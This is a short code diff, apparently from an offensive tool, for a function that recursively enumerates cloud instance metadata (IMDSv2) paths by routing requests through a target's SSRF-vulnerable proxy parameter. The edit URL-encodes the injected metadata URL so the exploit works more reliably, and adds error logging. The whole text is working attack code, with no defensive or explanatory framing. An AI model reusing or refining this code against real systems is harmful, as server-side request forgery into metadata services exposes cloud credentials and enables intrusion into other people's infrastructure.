@@ -43,7 +43,7 @@ export async function enumerateIMDSRecursive(proxyUrl, token, basePath = "/lates
               }
             } else {
               const itemUrl = `${CONFIG.imdsv2.baseUrl}${fullPath}`;
-              const itemFullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${itemUrl}`;
+              const itemFullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${encodeURIComponent(itemUrl)}`;
 
               const itemResponse = await axios.get(itemFullUrl, {
                 headers: {
@@ -59,6 +59,7 @@ export async function enumerateIMDSRecursive(proxyUrl, token, basePath = "/lates
               }
             }
           } catch (error) {
+            console.error(`Error enumerating path ${fullPath}:`, error.message);
           }
         }
       } else {
@@ -66,6 +67,7 @@ export async function enumerateIMDSRecursive(proxyUrl, token, basePath = "/lates
       }
     }
   } catch (error) {
+    console.error(`Error enumerating base path ${basePath}:`, error.message);
   }
 
   return discoveredPaths;
